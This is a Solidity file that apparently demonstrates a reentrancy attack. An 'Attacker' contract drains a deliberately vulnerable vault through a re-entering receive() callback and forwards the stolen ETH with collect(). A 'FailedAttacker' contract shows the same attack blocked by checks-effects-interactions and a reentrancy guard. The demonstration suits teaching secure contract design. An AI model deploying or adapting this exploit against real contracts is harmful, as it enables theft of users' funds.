// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableVault.sol";
import "./SecureVault.sol";

/**
 * @title Attacker
 * @notice Exploits VulnerableVault via reentrancy. Fails against SecureVault.
 *
 * @dev Attack flow:
 *      1. Attacker deploys this contract with VulnerableVault address
 *      2. Calls attack() with some ETH — this deposits into the vault
 *      3. Immediately calls withdraw() on the vault
 *      4. Vault sends ETH → triggers receive() on this contract
 *      5. receive() re-enters vault.withdraw() before vault updates balance
 *      6. Repeats until vault balance < attackAmount or depth limit hit
 *      7. Attacker withdraws drained ETH via collect()
 *
 *      The attack drains multiples of the initial deposit.
 *      If vault holds 10 ETH and attacker deposits 1 ETH,
 *      attacker can withdraw up to 11 ETH (their 1 + vault's 10).
 */
contract Attacker {

    VulnerableVault public immutable vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    /// @notice Entry point: deposit then immediately withdraw to trigger reentry.
    function attack() external payable {
        require(msg.value > 0, "need ETH to attack");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(attackAmount);
    }

    /// @notice Called automatically by the EVM every time this contract receives ETH.
    /// @dev This is the reentrant callback. While vault.withdraw() is mid-execution
    ///      and before it updates balances[attacker], we call withdraw() again.
    ///      The vault's balance check still passes — we drain another round.
    ///      try/catch ensures that when the vault finally runs dry and the last
    ///      reentrant withdraw() reverts, it doesn't bubble up and kill the whole tx.
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            try vault.withdraw(attackAmount) {} catch {}
        }
    }

    /// @notice Collect all drained ETH to the caller.
    function collect(address payable recipient) external {
        (bool ok,) = recipient.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title FailedAttacker
 * @notice Attempts the same reentrancy attack against SecureVault — fails.
 *
 * @dev Demonstrates that both CEI and the nonReentrant guard independently
 *      block the attack. The receive() reentry hits require() and reverts.
 */
contract FailedAttacker {

    SecureVault public immutable vault;
    uint256 public attackAmount;
    bool public attackReverted;

    constructor(address _vault) {
        vault = SecureVault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            // This will revert — CEI already zeroed the balance,
            // and the nonReentrant guard also blocks reentry.
            try vault.withdraw(attackAmount) {
                // never reached
            } catch {
                attackReverted = true; // confirms the defense worked
            }
        }
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
